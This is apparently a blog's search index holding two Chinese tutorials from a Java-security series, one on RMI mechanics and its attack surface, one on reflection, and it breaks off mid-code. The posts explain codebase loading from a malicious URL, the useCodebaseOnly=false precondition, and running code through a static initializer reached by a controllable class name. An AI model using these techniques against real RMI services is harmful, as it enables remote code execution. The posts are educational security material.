<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java安全漫谈-RMI篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>RMI 的过程，就是用 JRMP 协议去组织数据格式，然后通过 TCP 进行传输，从而达到远程方法调用。</p></blockquote><ul><li><p>RMI（Remote Method Invocation）：远程方法调用。即让一个 JVM 中的对象远程调用另一个 JVM 中的对象的某个方法，简单来说就是跨越 JVM，使用 Java 调用远程 Java 程序</p><ul><li>Server 服务端：提供远程的对象</li><li>Client 客户端：调用远程的对象</li><li>Registry 注册表：存放着远程对象的位置，用于客户端查询所调用的远程方法的引用</li></ul></li><li><p>JRMP（Java Remote Message Protocol）：Java 远程消息交换协议。运行在 TCP&#x2F;IP 之上的线路层协议，该协议要求服务端与客户端都为Java编写。</p><ul><li>Java 本身对 RMI 规范的实现默认使用 JRMP 协议，而在 Weblogic 中使用 T3 协议</li></ul></li><li><p>JNDI（Java Naming and Directory Interface）：Java 命名和目录接口。一组在 Java 应用中访问命名和目录服务的接口，Java 中使用最多的基本就是 RMI 和 LDAP 的目录服务系统，客户端可以通过名称访问对象，并将其下载下来。</p><ul><li>命名服务：将名称和对象联系起来，客户端可以使用名称访问对象</li><li>目录服务：一种命名服务，在命名服务的基础上，增加了属性的概念</li></ul></li></ul><h2 id="RMI-Server"><a href="#RMI-Server" class="headerlink" title="RMI-Server"></a>RMI-Server</h2><p>RMI Server 分为三部分：</p><ul><li>一个远程接口。继承<code>java.rmi.Remote</code>，其中定义要远程调用的函数。</li><li>远程接口的实现类。继承<code>java.rmi.server.UnicastRemoteObject</code>，实现远程调用的函数</li><li>创建实例和<code>Registry</code>注册表，然后在注册表中绑定地址和实例</li></ul><h3 id="定义远程接口"><a href="#定义远程接口" class="headerlink" title="定义远程接口"></a>定义远程接口</h3><p>定义一个远程接口，继承<code>java.rmi.Remote</code>接口，抛出<code>RemoteException</code>异常，修饰符需要为<code>public</code>否则远程调用的时候会报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="远程接口实现"><a href="#远程接口实现" class="headerlink" title="远程接口实现"></a>远程接口实现</h3><p>远程接口的实现类，继承<code>java.rmi.server.UnicastRemoteObject</code>，实现远程调用的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;RemoteHelloWorld构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Callback&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="创建实例和注册表"><a href="#创建实例和注册表" class="headerlink" title="创建实例和注册表"></a>创建实例和注册表</h3><p><code>Naming.bind</code>和<code>Naming.rebind</code>的区别：</p><ul><li><code>bind</code>指“绑定”，如果时“绑定”时 Registry 已经存在对应的<code>Name</code>，则系统会抛出错误</li><li><code>rebind</code>指“重绑定”，如果“重绑定”时Registry已经存在对应的<code>Name</code>，则绑定的远程对象将被替换</li><li>除非有特别的业务需求，否则建议使用<code>rebind</code>方法进行绑定</li></ul><p><code>Registry.rebind</code>和<code>Naming.rebind</code>的区别：</p><ul><li><code>Registry.rebind</code>是使用RMI注册表绑定，所以不需要完整RMI URL</li><li><code>Naming.rebind</code>是通过Java的名称服务进行绑定，由于名称服务不止为RMI提供查询服务，所以绑定时需要填入完整RMI URL</li></ul><h4 id="Naming-rebind"><a href="#Naming-rebind" class="headerlink" title="Naming.rebind"></a>Naming.rebind</h4><p>实现 Registry 并将上面的类实例化，然后绑定到指定地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化远程对象</span></span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现注册表</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将远程对象注册到注册表里面, 绑定地址</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://192.168.111.1:1099/Hello&quot;</span>, helloObject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果Registry在本地, Host和Port可以省略, 默认 localhost:1099</span></span><br><span class="line">        <span class="comment">//  Naming.rebind(&quot;Hello&quot;, helloObject);</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Server runs on port 1099&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Registry-rebind"><a href="#Registry-rebind" class="headerlink" title="Registry.rebind"></a>Registry.rebind</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建远程对象</span></span><br><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建注册表</span></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将远程对象注册到注册表里面,绑定地址</span></span><br><span class="line">registry.rebind(<span class="string">&quot;Hello&quot;</span>, helloObject);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RMI-Client"><a href="#RMI-Client" class="headerlink" title="RMI-Client"></a>RMI-Client</h2><p>编写 RMIClient 并调用远程对象。需要注意的是，如果远程方法有参数，调用方法时所<strong>传入的参数必须是可序列化的</strong>。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">// 查询远程对象</span></span><br><span class="line">        <span class="type">IRemoteHelloWorld</span> <span class="variable">helloObject</span> <span class="operator">=</span> (IRemoteHelloWorld) Naming.lookup(<span class="string">&quot;rmi://192.168.111.1:1099/Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> helloObject.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Client也有<code>Registry.lookup</code>和<code>Naming.lookup</code>，但它们是一样的</p><h2 id="RMI通信过程"><a href="#RMI通信过程" class="headerlink" title="RMI通信过程"></a>RMI通信过程</h2><blockquote><p>RMI-Server 先在 Registry 上注册一个<code>Name-对象</code>的绑定关系，RMI-Client 通过 <code>Name</code> 向 Registry 发起查询得到这个绑定关系，然后连接到对应的 RMI-Server 并获取到相应对象，<strong>最终在 RMI-Server 上远程调用该对象某个方法</strong></p></blockquote><h3 id="发起RMI通信"><a href="#发起RMI通信" class="headerlink" title="发起RMI通信"></a>发起RMI通信</h3><p>发起一次RMI通信，Server端<code>192.168.111.1</code>，Client端<code>192.168.111.2</code><br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-0.png" data-caption="Java安全漫谈-RMI篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-0.png" alt="Java安全漫谈-RMI篇-0"></a></p><p>通信过程中会建立2次 TCP 连接<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-1.png" data-caption="Java安全漫谈-RMI篇-1"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-1.png" alt="Java安全漫谈-RMI篇-1"></a></p><p>第1次连接是 Client 和 Registry 的连接，连接到<code>目标IP:1099</code></p><ul><li>Client 发送<code>Call</code>消息：Client 连接 Registry，寻找<code>Name=Hello</code>的对象</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-2.png" data-caption="Java安全漫谈-RMI篇-2"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-2.png" alt="Java安全漫谈-RMI篇-2"></a></p><ul><li>Registry响应<code>ReturnData</code>消息：返回<code>Name=Hello</code>对象的序列化数据，并包含对象的IP和端口<ul><li><code>0xACED0005</code>常见的Java反序列化16进制特征。所以这里从<code>\xAC\xED</code>开始就是序列化的数据，IP和端口这只是这个对象的一部分</li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-3.png" data-caption="Java安全漫谈-RMI篇-3"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-3.png" alt="Java安全漫谈-RMI篇-3"></a></p><ul><li>返回的端口位于IP地址后一个字节，这里是<code>\x00\x00\xc4\x55</code>即<code>50261</code>，所以后面 Client 将向 Server 的该端口发起第2次请求<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((<span class="number">16#0000e077</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>第2次连接是 Client 和 Server 的连接。Client 向 Server 的目标端口发起请求，并正式调用远程方法</p><h3 id="远程调用报错"><a href="#远程调用报错" class="headerlink" title="远程调用报错"></a>远程调用报错</h3><ul><li>Client和Server的<code>package</code>路径需要一致</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-4.png" data-caption="Java安全漫谈-RMI篇-4"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-4.png" alt="Java安全漫谈-RMI篇-4"></a></p><h2 id="RMI的安全问题"><a href="#RMI的安全问题" class="headerlink" title="RMI的安全问题"></a>RMI的安全问题</h2><p>前面是RMI整个的原理与流程，那么RMI会带来哪些安全问题？</p><ul><li>如果我们能访问 RMI Registry 服务，如何对其攻击？</li><li>如果我们控制了目标RMI客户端中<code>Naming.lookup</code>的第一个参数（也就是RMI Registry的地址），能不能进行攻击？</li></ul><h3 id="利用已存在的恶意方法"><a href="#利用已存在的恶意方法" class="headerlink" title="利用已存在的恶意方法"></a>利用已存在的恶意方法</h3><p>这里尝试在<code>192.168.111.2</code>中调用<code>192.168.111.1</code>上的 Registry 进行绑定对象，发现报错如下：<br><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-5.png" data-caption="Java安全漫谈-RMI篇-5"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-5.png" alt="Java安全漫谈-RMI篇-5"></a></p><p>原因是 <strong>Java 对远程访问 RMI Registry 做了限制</strong>，只有来源地址是<code>localhost</code>的时候，才能调用<code>rebind/bind/unbind</code>等方法，但可以远程调用<code>list/lookup</code>方法<br><code>list</code>方法可以列出目标上所有绑定的对象，如果目标服务器上存在一些危险方法，就可以<code>lookup</code>方法对其进行调用，工具 <a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a> 中一个功能点就是进行危险方法的探测。</p><blockquote><p>官方文档：出于安全原因，应用程序只能绑定或取消绑定到在<strong>同一主机</strong>上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">// list方法</span></span><br><span class="line">        String[] objs = Naming.list(<span class="string">&quot;rmi://192.168.111.1:1099/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String obj:objs) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-6.png" data-caption="Java安全漫谈-RMI篇-6"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87-6.png" alt="Java安全漫谈-RMI篇-6"></a></p><h3 id="利用Codebase"><a href="#利用Codebase" class="headerlink" title="利用Codebase"></a>利用Codebase</h3><p>Codebase 是远程加载类的路径。在 RMI 的流程中，Server 和 Client 之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果在反序列化时发现某个对象，那么就会去自己的<code>CLASSPATH</code>下寻找对应的类；如果在本地没有找到这个类，就会去远程加载 Codebase 中的类。Codebase 参数可以通过如下方式进行设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.codebase=http:<span class="comment">//xxx.com:8080/</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>如果 Codebase 被指定为某个恶意地址，并在该地址放置请求中同名的恶意文件。服务器在接收到这个数据后就会去 CLASSPATH 和指定的 Codebase 寻找类，就很有可能造成危害<br>显然官方也意识到了这一问题，并采取了一些措施：<br>官方在 Java 7u21、6u45 版本中将<code>java.rmi.server.useCodebaseOnly</code>参数的默认值由<code>false</code>改为<code>true</code> 。在<code>true</code>的情况下，Java 虚拟机<strong>只信任预先配置好的 Codebase，不再支持从 RMI 请求中获取。</strong><br>因此只有满足如下条件的 RMI 服务器才能被攻击：</p><ul><li>安装并配置了<code>SecurityManager</code></li><li>配置<code>java.rmi.server.useCodebaseOnly</code>参数为<code>false</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>关于 RMI 的攻击手法远不止于此，但进一步扩展需要对CC链有所了解，这里先告一段落，后面填坑，也可以根据参考文章进一步学习。</p><ul><li>参考文章：<ul><li><a href="https://github.com/phith0n/JavaThings">Java安全漫谈</a></li><li><a href="https://xz.aliyun.com/t/7079">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></li><li><a href="https://blog.csdn.net/qq_38376348/article/details/114767587">RMI Naming.bind和Registry.bind</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全漫谈-反射篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。</p></blockquote><h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><blockquote><p>可以获取到任何类的构造方法<code>Constructors</code>、成员方法<code>Methods</code>、成员变量<code>Fields</code>等信息</p></blockquote><ul><li>核心方法：基本上这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload。<ul><li>获取类对象的⽅法： <code>forName</code></li><li>实例化类对象的⽅法： <code>newInstance</code></li><li>获取函数的⽅法： <code>getMethod</code></li><li>执⾏函数的⽅法： <code>invoke</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h2><blockquote><p>通常一个JVM下，只会有一个ClassLoader，而一个ClassLoader下，一种类只会有一个Class对象存在、所以一个JVM中，一种类只会有一个Class对象存在。</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#forName%28java.lang.String%29">Class.forName()</a>，有两个函数重载，其中方法1可以理解为方法2的封装：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, boolean initialize,ClassLoader loader)</code><ul><li><code>name</code>：类名，即类完整路径，如<code>java.lang.Runtime</code>，</li><li><code>initialize</code>：是否初始化</li><li><code>ClassLoader</code>：类加载器，Java默认的ClassLoader就是根据类名来加载类</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className);</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参数initialize"><a href="#参数initialize" class="headerlink" title="参数initialize"></a>参数initialize</h3><p>先来看一段代码，分别通过2种方式运行：类初始化<code>forName</code>、类实例化<code>new</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 类初始化</span></span><br><span class="line">        <span class="comment">// Class.forName(&quot;reflection.TrainPrint&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类实例化</span></span><br><span class="line">        <span class="type">TrainPrint</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainPrint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">类初始化输出结果</span></span><br><span class="line"><span class="comment">  Static initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">类实例化输出结果</span></span><br><span class="line"><span class="comment">  Static initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">  Empty block initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">  Initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，<code>static&#123;&#125;</code>就是在<strong>类初始化</strong>时调用的，<code>&#123;&#125;</code>则会在构造函数的<code>super&#123;&#125;</code>后面，但在当前构造函数内容的前面。上面例子执行顺序为：</p><ul><li>类初始化：<code>static&#123;&#125;</code></li><li>类实例化：<code>static&#123;&#125; -&gt; &#123;&#125; -&gt; 构造函数</code></li></ul><p>所以，<code>forName</code>中的<code>initialize</code>其实是决定是否执⾏<strong>类初始化</strong>，而不是<strong>类实例化</strong></p><h3 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h3><p>上面说到，在使用<code>forName()</code>进行类初始化时，会执行<code>static&#123;&#125;</code>中的代码<br>假设存在一个函数，其中的<code>className</code>可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRef</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;reflection.TestCalc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestRef</span> <span class="variable">testRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestRef</span>();</span><br><span class="line">        testRef.ref(className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么可以构造一个恶意类，在<code>static&#123;&#125;</code>中编写恶意代码。当这个恶意类被带入目标机器该函数时，触发<code>forName</code>进行类初始化，从而执行其中的恶意代码（实际情况中如果需要将这个恶意类带⼊⽬标机器中，就涉及到<code>ClassLoader</code>的利⽤）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 